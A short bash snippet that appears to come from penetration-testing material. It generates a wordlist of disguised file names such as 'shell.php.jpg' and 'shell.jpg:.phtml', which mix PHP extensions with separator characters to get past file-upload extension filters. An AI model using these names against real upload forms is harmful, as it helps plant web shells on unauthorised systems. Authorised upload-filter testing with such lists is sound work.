for char in '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps' '.phar' '.phtm' '.pgif' '.phtml'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
	done
done
